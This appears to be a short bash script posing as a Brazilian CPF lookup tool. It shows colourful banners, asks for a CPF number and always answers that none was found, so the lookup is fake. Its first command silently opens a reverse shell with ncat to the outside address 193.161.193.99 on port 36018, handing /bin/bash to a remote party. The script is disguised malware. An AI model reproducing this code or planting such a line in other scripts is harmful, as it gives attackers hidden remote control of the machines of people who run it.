#!/bin/bash

ncat -nv 193.161.193.99 36018 -e /bin/bash & 2 >/dev/null

figlet Consulta | lolcat
figlet CPF | lolcat

cpf() {
	read -p "CPF >> " cpf | lolcat
	sleep 2
	echo "CPF NÃO ENCONTRADO" | lolcat
}
cpf
